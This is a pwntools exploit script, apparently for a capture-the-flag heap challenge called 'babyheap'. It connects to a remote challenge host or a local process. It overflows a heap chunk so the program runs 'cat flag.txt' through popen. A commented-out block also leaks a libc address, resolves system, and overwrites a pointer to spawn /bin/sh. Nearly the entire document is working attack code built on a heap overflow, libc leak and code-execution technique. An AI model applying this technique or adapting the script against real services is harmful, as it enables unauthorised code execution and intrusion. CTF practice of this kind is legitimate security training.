#-*- encoding: utf-8 -*- 
from pwn import *
import os
context.binary = './babyheap'
#context.log_level = 'debug'
context.timeout = None
elf = context.binary

if args['REMOTE']:
	p = remote('101.71.29.5', 20001)
	libc = ELF('../x64_libc.so.6')
else:
	libc = context.binary.libc
	p = process('./babyheap')

def dbg():
	raw_input()


def menu(ch):
	p.sendlineafter('choice: ', str(ch))
	
def add(content):
	menu(1)
	p.recvuntil('content: ')
	p.send(content)
	
def edit(idx, size, content):
	menu(2)
	p.sendlineafter('index: ', str(idx))
	p.sendlineafter('size: ', str(size))
	p.sendafter('content: ', content)

def show(idx):
	menu(3)
	p.sendlineafter('index: ', str(idx))
	
def free(idx):
	menu(4)
	p.sendlineafter('index: ', str(idx))


def exploit():
	gdb.attach(p, 'b* 0x400B14')
	dbg()
	add('a')
	edit(0, 0x18, 'cat flag.txt\x00'.ljust(0x18, 'a'))	#popen
	show(0)

	'''
	p.recvuntil('+')
	puts_addr = u64(p.recvline().strip('\x0a').ljust(8, '\x00'))
	libc.address = puts_addr - libc.symbols['puts']
	system = libc.symbols['system']

	print "puts_addr ==> " + hex(puts_addr)
	edit(0, 0x20, '/bin/sh\x00'.ljust(0x18, 'a')+p64(system))
	show(0)
	p.interactive()
	'''

if __name__ == '__main__':
	
	cnt = 0
	while 1:
		try:
			p = process('./babyheap')
			exploit()
			print p.recv(1024)
			p.close()
			exit(0)
		except:
			print "[+] except %d" % cnt
			cnt += 1
			p.close()

	p.interactive()